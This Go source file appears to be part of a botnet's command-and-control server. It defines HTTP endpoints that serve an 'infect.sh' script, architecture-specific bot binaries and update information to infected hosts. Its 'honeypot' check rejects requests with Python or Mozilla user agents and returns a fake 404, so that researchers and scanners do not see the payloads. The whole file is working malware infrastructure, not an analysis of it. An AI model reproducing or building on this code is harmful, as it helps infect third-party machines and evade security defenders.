package api

import (
	//"cnc/lib/grafana"
	"cnc/lib/utils"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"strings"
)

var (
	// We are using only curl / wget so other are just honeypots...
	BlacklistedUa = []string{
		"Python",
		"Mozilla",
	}
)

func CounterHoneypots(r *http.Request) bool {
	for _, ua := range BlacklistedUa {
		if strings.Contains(r.Header.Get("user-agent"), ua) {
			utils.Debug(fmt.Sprintf("[!] Honeypot counter user-agent detection: %s (match: %s)", r.RemoteAddr, ua))
			//grafana.HoneypotCount.WithLabelValues(strings.ToUpper(ua)).Add(1)
			return true
		}
	}

	return false
}

func getVersion(w http.ResponseWriter, r *http.Request) {
	//grafana.ReqCount.WithLabelValues("/update").Add(1)

	if CounterHoneypots(r) {
		w.WriteHeader(http.StatusForbidden)
		io.WriteString(w, "404 page not found")
		return
	}

	arch := strings.ReplaceAll(r.URL.Query().Get("arch"), "x86_64", "amd64")
	utils.Debug(fmt.Sprintf("[%s] Fetch lasted build for %s", r.RemoteAddr, arch))

	// version|url|name
	w.WriteHeader(http.StatusOK)
	w.Header().Add("Connection", "close")
	io.WriteString(w, fmt.Sprintf("%s|http://%s:%d/download?arch=%s|rose.%s", utils.Version, utils.ServerIP, utils.HttpApiPrivateServerPort, arch, arch))
}

func sendBin(w http.ResponseWriter, r *http.Request) {
	//grafana.ReqCount.WithLabelValues("/download").Add(1)

	if CounterHoneypots(r) {
		w.WriteHeader(http.StatusForbidden)
		io.WriteString(w, "404 page not found")
		return
	}

	arch := r.URL.Query().Get("arch")
	if arch == "" {
		io.WriteString(w, "Error")
		return
	}

	arch = strings.ReplaceAll(arch, "x86_64", "amd64")
	utils.Debug(fmt.Sprintf("[%s] Download build for %s", r.RemoteAddr, arch))

	fileBytes, err := ioutil.ReadFile(fmt.Sprintf("bin/builds/%s.%s", utils.BinBaseName, arch))
	if err != nil {
		fmt.Println(err)
		io.WriteString(w, "Error")
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(fileBytes)

	//grafana.DownloadCount.WithLabelValues(strings.ToUpper(arch)).Add(1)
}

func sendBash(w http.ResponseWriter, r *http.Request) {
	//grafana.ReqCount.WithLabelValues("/infect").Add(1)

	if CounterHoneypots(r) {
		w.WriteHeader(http.StatusForbidden)
		io.WriteString(w, "404 page not found")
		return
	}

	utils.Debug(fmt.Sprintf("[%s] Download infect script", r.RemoteAddr))

	fileBytes, err := ioutil.ReadFile("bin/infect.sh")
	if err != nil {
		io.WriteString(w, "Error")
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(fileBytes)
}

func ListenPrivateHttpServer() {
	http.HandleFunc("/update", getVersion)
	http.HandleFunc("/download", sendBin)
	http.HandleFunc("/infect", sendBash)

	fmt.Printf("[PRV-API] Listening on port %d\n", utils.HttpApiPrivateServerPort)
	err := http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", utils.HttpApiPrivateServerPort), nil)
	utils.HandleError(err)
}
